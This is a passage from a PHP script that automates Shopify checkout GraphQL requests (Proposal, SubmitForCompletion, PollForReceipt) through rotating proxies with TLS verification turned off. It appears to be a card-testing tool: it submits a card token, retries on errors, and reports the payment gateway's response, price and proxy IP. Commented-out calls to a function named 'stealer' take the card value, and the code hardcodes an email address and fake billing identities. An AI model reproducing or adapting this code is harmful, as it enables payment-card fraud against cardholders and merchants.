                                'amount' => $minPrice,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address,
                        'address2' => '',
                        'city' => $city_us,
                        'countryCode' => 'US',
                        'postalCode' => $zip_us,
                        'firstName' => $firstname,
                        'lastName' => $lastname,
                        'zoneCode' => $state_us,
                        'phone' => $phone,
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => 'USD',
                    'countryCode' => 'US'
                ],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => 'US',
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => 'US'
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => null,
                'proposedTotalIncludedAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => 'USD'
                    ]
                ],
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
]));

$response3 = curl_exec($ch);
// echo "<li>step_3: $response3<li>";
if (curl_errno($ch)) {
    $curl_error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    curl_close($ch);
    
    if ($retryCount < $maxRetries) {
        $retryCount++;
        
        $isProxyError = in_array($curl_errno, [7, 28, 35, 52, 56, 58, 59]);
        $delay = $proxySettings['retry_delay'] * $retryCount;
        usleep($isProxyError ? $delay : $delay / 2);
        
        goto proposal;
    } else {
        $err = 'Proposal Failed => ' . $curl_error;
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
            'Gateway' => $gateway,
            'ProxyStatus' => $proxymsg,
            'ProxyIP' => $ip,
            'ErrorCode' => $curl_errno
        ]);
        echo $result;
        exit;
    }
}


$decoded = json_decode($response3);

$gateway = '';
$paymentMethodName = 'null'; // Valor predeterminado en caso de que no haya nombre de método de pago

if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal; // Retry the entire operation
        } else {
            $err = 'Shipping info is empty';
            // stealer($cc1, $err, $gateway, $minPrice, $site1, $proxy, 'Shipping Info Empty - Response: ' . substr($response3, 0, 500));
            $result = json_encode([
                'Response' => $err,
                'Price' => $minPrice,
                'Gateway' => $gateway,
            ]);
            echo $result;
            exit;
        }
    } else {
        // Si `availablePaymentLines` existe y tiene elementos, busca el nombre del método de pago
        if (!empty($firstStrategy->payment->availablePaymentLines)) {
            foreach ($firstStrategy->payment->availablePaymentLines as $paymentLine) {
                if (isset($paymentLine->paymentMethod->name)) {
                    $paymentMethodName = $paymentLine->paymentMethod->name;
                    break; // Sal del bucle una vez que encuentres el primer nombre de método de pago
                }
            }
        }
    }
}

// Asignar el nombre del método de pago al resultado final
$gateway = $paymentMethodName;

if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
    } 
    if (empty($handle)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Handle is empty';
            // stealer($cc1, $err, $gateway, $minPrice, $site1, $proxy, 'Handle Empty - Response: ' . substr($response3, 0, 500));
            $result = json_encode([
                'Response' => $err,
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ]);
            echo $result;
            exit;
        }
    }
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    if (empty($delamount)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Delivery rates are empty';
            // stealer($cc1, $err, $gateway, $minPrice, $site1, $proxy, 'Delivery Rates Empty - Response: ' . substr($response3, 0, 500));
            $result = json_encode([
                'Response' => $err,
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ]);
            echo $result;
            exit;
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    }
    elseif (empty($tax)) {
        if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
        }
        $err = 'Tax amount is empty';
        // stealer($cc1, $err, $gateway, $minPrice, $site1, $proxy, 'Tax Amount Empty - Response: ' . substr($response3, 0, 500));
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
            'Gateway' => $gateway,
        ]);
        echo $result;
        exit;
    }
    $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
    $totalamt = $firstStrategy->runningTotal->value->amount;
    $price = $totalamt;
    $resultg = json_encode([
    'Response' => 'Success',
    'Details' => [
        'Price' => $minPrice,
        'Shipping' => $delamount,
        'Tax' => $tax,
        'Total' => $totalamt,
        'Currency' => $currencycode,
        'Gateway' => $gateway,
    ],
]);
    //echo $resultg;
if ($totalamt == '10.98' && $currencycode == 'USD') {
    $postf = json_encode([
        'query' => extractQueryFromFile('jsonq.txt', 2),
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address,
                                                    'address2' => '',
                                                    'city' => $city_us,
                                                    'countryCode' => 'US',
                                                    'postalCode' => $zip_us,
                                                    'firstName' => $firstname,
                                                    'lastName' => $lastname,
                                                    'zoneCode' => $state_us,
                                                    'phone' => ''
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => 'US',
                                'countryCode' => 'US'
                            ],
                            'email' => $email,
                            'emailChanged' => false,
                            'phoneCountryCode' => 'US',
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => 'US'
                            ],
                            'rememberMe' => false
                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($currencycode == 'USD') {
    $postf = json_encode([
        'query' => extractQueryFromFile('jsonq.txt', 3),
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address,
                                        'address2' => '',
                                        'city' => $city_us,
                                        'countryCode' => 'US',
                                        'postalCode' => $zip_us,
                                        'firstName' => $firstname,
                                        'lastName' => $lastname,
                                        'zoneCode' => $state_us,
                                        'phone' => $phone,
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                            'latitude' => $lat,
                                            'longitude' => $lon
                                        ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING',
                                    'LOCAL'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address,
                                                'address2' => '',
                                                'city' => $city_us,
                                                'countryCode' => 'US',
                                                'postalCode' => $zip_us,
                                                'firstName' => $firstname,
                                                'lastName' => $lastname,
                                                'zoneCode' => $state_us,
                                                'phone' => $phone
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $num_us . $address_us,
                                'address2' => '',
                                'city' => $city_us,
                                'countryCode' => 'US',
                                'postalCode' => $zip_us,
                                'firstName' => $firstname,
                                'lastName' => $lastname,
                                'zoneCode' => $state_us,
                                'phone' => $phone
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US'
                        ],
                        'email' => $email,
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => 'US'
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);    
} 
elseif ($currencycode == 'NZD') {
    $postf = json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 4),
        'variables' => [
            'input' => [
                'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyMatchingConditions' => [
                                    'estimatedTimeInTransit' => [
                                        'any' => true
                                    ],
                                    'shipments' => [
                                        'any' => true
                                    ]
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'NONE'
                            ],
                            'expectedTotalPrice' => [
                                'any' => true
                            ],
                            'destinationChanged' => true
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => '11 Northside Drive',
                                            'address2' => 'Westgate',
                                            'city' => 'Auckland',
                                            'countryCode' => 'NZ',
                                            'postalCode' => '0814',
                                            'firstName' => 'xypher',
                                            'lastName' => 'xd',
                                            'zoneCode' => 'AUK',
                                            'phone' => ''
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => '11 Northside Drive',
                            'address2' => 'Westgate',
                            'city' => 'Auckland',
                            'countryCode' => 'NZ',
                            'postalCode' => '0814',
                            'firstName' => 'xypher',
                            'lastName' => 'xd',
                            'zoneCode' => 'AUK',
                            'phone' => ''
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'NZD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'insaneff612@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'NZD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => $checkoutToken . '-y4dcjm00nor',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
}

 else {$postf = json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 5),
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'destination' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $zip_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                    ]
                                ]
                            ],
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyByHandle' => [
                                    'handle' => $handle,
                                    'customDeliveryRate' => false
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'SHIPPING',
                                'LOCAL'
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $delamount,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'destinationChanged' => false
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                    'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => $address,
                                            'address2' => '',
                                            'city' => $city_us,
                                            'countryCode' => 'US',
                                            'postalCode' => $zip_us,
                                            'firstName' => $firstname,
                                            'lastName' => $lastname,
                                            'zoneCode' => $zip_us,
                                            'phone' => $phone
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => $address,
                            'address2' => '',
                            'city' => $city_us,
                            'countryCode' => 'US',
                            'postalCode' => $zip_us,
                            'firstName' => $firstname,
                            'lastName' => $lastname,
                            'zoneCode' => $state_us,
                            'phone' => $phone
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'USD',
                        'countryCode' => 'US'
                    ],
                    'email' => $email,
                    'emailChanged' => false,
                    'phoneCountryCode' => 'US',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'countryCode' => 'US'
                    ]
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => $tax,
                            'currencyCode' => 'USD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);    
}
    $totalamt = $firstStrategy->runningTotal->value->amount;
recipt:

usleep(250000); // 0.25 seconds instead of 0.5

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
if ($proxySettings['tunnel']) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
if (!empty($proxyDetails['auth'])) {
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_TIMEOUT, $proxySettings['timeout'] + 15);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $proxySettings['connect_timeout'] + 5);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase.'/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);


curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

$response4 = curl_exec($ch);
//echo "<li>receipt: $response4<li>";
if (curl_errno($ch)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt; 
    } else {
        error('Curl Error.', $proxymsg, $ip, $price, $gateway);
    }
}
if (strpos($response4, '"errors":[{"code":"CAPTCHA_METADATA_MISSING"')) {
    $err = "SITE DEAD w8 40mim And Try Again...";
    error($err, $proxymsg, $ip, $price, $gateway);
}

$response4js = json_decode($response4); 

if (isset($response4js->data->submitForCompletion->receipt->id)) {
    $recipt_id = $response4js->data->submitForCompletion->receipt->id;
} elseif (empty($recipt_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        error('Receipt ID is Empty', $proxymsg, $ip, $price, $gateway);
    }
}

 

poll:

$postf2 = json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 6),
    'variables' => [
        'receiptId' => $recipt_id,
        'sessionToken' => $x_checkout_one_session_token
    ],
    'operationName' => 'PollForReceipt'

]);

usleep(250000); // 0.25 seconds instead of 0.5
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
